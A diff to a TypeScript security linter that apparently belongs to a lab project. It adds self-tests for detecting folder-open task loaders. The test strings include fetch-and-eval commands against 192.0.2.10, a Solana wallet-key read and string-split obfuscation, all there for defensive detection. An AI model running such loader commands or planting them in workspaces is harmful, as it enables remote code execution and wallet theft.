@@ -58,7 +58,7 @@ const RULES: Rule[] = [
 	// (test/window.ts: open -g -n) and are captured by window id while covered. Any activate or
 	// frontmost call, a foreground `open -a/-b`, or a direct exec of the app's CLI is a violation.
 	{ id: 'focus-steal', why: 'brings a window/app to the front (launch with test/window.ts, capture with screencapture -l)',
-		re: /\bto\s+activate\b|\bactivate\s+(application|app)\b|\.activate\(\s*\)|activateIgnoringOtherApps|activateWithOptions|\bset\s+frontmost\b|\bfrontmost\s*[:=]\s*true|\bfocus\(\s*\{\s*steal\b|\bopen\s+(?!(?:[^\n]*\s)?(-[a-zA-Z]*g[a-zA-Z]*\b|--background\b))(-[A-Za-z]+\s+|--env\s+\S+\s+)*-[ab]\s|['"]open['"]\s*,(?![^\n]*['"]-g['"])[^\n]*['"]-[ab]['"]|Resources\/app\/bin\/code\b/ },
+		re: /\bto\s+activate\b|\bactivate\s+(application|app)\b|\.activate\(\s*\)|activateIgnoringOtherApps|activateWithOptions|\bset\s+frontmost\b|\bfrontmost\s*[:=]\s*true|\bfocus\(\s*\{\s*steal\b|\bopen\s+(?!(?:-[A-Za-z]+\s+|--env\s+\S+\s+)*(?:-[A-Za-z]*g[A-Za-z]*|--background)\b)(?:-[A-Za-z]+\s+|--env\s+\S+\s+)*(?:-[A-Za-z]*[ab][A-Za-z]*\s|\S+\.app\b)|['"]open['"]\s*,(?![^\n]*?['"]-[A-Za-z]*g[A-Za-z]*['"][^\n]*?['"]--args['"]|(?![^\n]*['"]--args['"])[^\n]*?['"]-[A-Za-z]*g[A-Za-z]*['"])[^\n]*?(?:['"]-[A-Za-z]*[ab][A-Za-z]*['"]|\.app['"])|Resources\/app\/bin\/code\b/ },
 ];
 
 // Network: every URL host must be a test-owned target. IPs are validated as literal IPs
@@ -137,14 +137,6 @@ function lintFile(file: string): void {
  * folder-open task whose script holds the loader traits is caught. Not opt-outable; such
  * content is stored as encoded parts and assembled only inside a tab.
  */
-function readRepo(rel: string): string | undefined {
-	try {
-		const p = path.join(repo, rel);
-		return fs.statSync(p).size < 2 << 20 ? fs.readFileSync(p, 'utf8') : undefined;
-	} catch {
-		return undefined;
-	}
-}
 function lintText(rel: string, text: string): string[] {
 	return text.split('\n').flatMap((line, i) => lintLine(rel, line, i + 1));
 }
@@ -205,6 +197,9 @@ if (selfTest) {
 		['open -n -a .work/app/seclab-vscode.app --args x', 1], ["execFileSync('open', ['-n', '-a', app])", 1],
 		['open -g -n -a .work/app/seclab-vscode.app --args x', 0], ["return ['open', '-g', '-n', ...envArgs, '-a', app]", 0],
 		['<app>/Contents/Resources/app/bin/code --user-data-dir x', 1], ['export function activate(context) {', 0], ['open README.md', 0],
+		// SS-7: combined flags, a bare .app, -g only after --args
+		['open -na .work/app/X.app', 1], ['open /Applications/X.app', 1], ['open -n -a X --args -g', 1], ['open -gna X', 0], ['open --background -a X', 0],
+		["spawn('open', ['-n', '-a', app, '--args', '-g'])", 1],
 	];
 	const bad = cases.filter(([l, n]) => lintLine('self-test', l, 1).length !== n).map(([l, n]) => `expected ${n}: ${l} -> ${JSON.stringify(lintLine('self-test', l, 1))}`);
 	// Workspace-level AV shapes (av-shape.ts): single-file, split-file, host file, and exemptions.
@@ -217,10 +212,16 @@ if (selfTest) {
 			['w/.seclab/loader.sh', `nohup sh -c "${F} -s -o /dev/null http://192.0.2.10/p; node -${'e'} 1" &\n`]]), 2],
 		['split-file: wallet path only', ws([[`w/.vscode/${T}`, `{"tasks":[{"presentation":{"reveal":"never"},"command":"\${workspaceFolder}/run.sh"}]}`], ['w/run.sh', `cat ~/.config/sol${'ana'}/id.json\n`]]), 1],
 		['split-file: args array, node script', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"node","args":["scripts/setup.js"]}]}`], ['w/scripts/setup.js', `require('child_process').spawn('x', [], { detached: true })\n`]]), 1],
+		// SS-2: forms a reference parser misses; the workspace rule doesn't parse references.
+		['options.cwd + extensionless script', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"options":{"cwd":"\${workspaceFolder}/s"},"command":"sh setup"}]}`], ['w/s/setup', `${F} -s http://192.0.2.10/p -o x\n`]]), 1],
+		['renamed stage (.dict) via npm run', ws([[`w/.vscode/${T}`, `{"tasks":[{${FO},"command":"npm run setup"}]}`], ['w/package.json', '{"scripts":{"setup":"node .vscode/spellright.dict"}}'],
+			['w/.vscode/spellright.dict', `const d = await ${'fet' + 'ch'}('https://192.0.2.10/p'); ${'Func' + 'tion'}(await d.text())()\n`]]), 2],
+		['.code-workspace task + JS axios stage', ws([['w/x.code-workspace', `{"tasks":{"tasks":[{${FO},"command":"node ."}]}}`], ['w/index.js', `require('${'axi' + 'os'}').get('http://192.0.2.10/p')\n`]]), 1],
 		['parts are exempt', ws([['w/.seclab/loader.parts.json', `{"a":"${F} -s http://192.0.2.10/p","b":"${P}sh"}`]]), 0],
 		['host file fetch + eval', ws([['tools/x.sh', `${F} -s http://192.0.2.10/p -o p.js\nnode -${'e'} "$(cat p.js)"\n`]]), 1],
 		['harness fetch without eval', ws([['tools/y.sh', `${F} -fsS http://127.0.0.1:8080/health\n`]]), 0],
 		['task without auto-run', ws([[`w/.vscode/${T}`, `{"tasks":[{"command":"sh run.sh"}]}`], ['w/run.sh', `nohup x &\n`]]), 0],
+		['a sibling workspace is not affected', ws([[`a/.vscode/${T}`, `{"tasks":[{${FO},"command":"sh run.sh"}]}`], ['b/run.sh', `nohup x &\n`]]), 0],
 	];
 	bad.push(...files.filter(([, m, n]) => avFindings(m).length !== n).map(([name, m, n]) => `expected ${n} av findings (${name}): ${JSON.stringify(avFindings(m))}`));
 	const docs: Array<[string, number]> = [[`Its command is \`${F} 'https://x.vercel.app/s?flag=1'${P}sh\``, 1], [`hides \`${F} …${P}sh\` in a task`, 0],
@@ -237,7 +238,8 @@ function walk(p: string): void {
 	} catch {
 		return;
 	}
-	const inFixtures = p.startsWith(FIXTURE_DIR + path.sep);
+	// Any fixtures/ tree is linted whole: a payload can hide in a file of any name (SS-2).
+	const inFixtures = p.startsWith(FIXTURE_DIR + path.sep) || p.includes(`${path.sep}fixtures${path.sep}`);
 	if (st.isDirectory()) {
 		// Fixture trees are linted whole: a payload can hide in any file name.
 		if (inFixtures || !SKIP_DIRS.has(path.basename(p))) {
@@ -252,7 +254,7 @@ function walk(p: string): void {
 for (const r of roots) {
 	walk(r);
 }
-violations.push(...avFindings(lintedTexts, readRepo));
+violations.push(...avFindings(lintedTexts));
 // Recorded evidence (probe runs and their outputs) holds strings a hostile tab chose. Only the
 // agent-injection rule applies there: real hosts and paths in evidence are facts, not payloads.
 if (!args.length) {
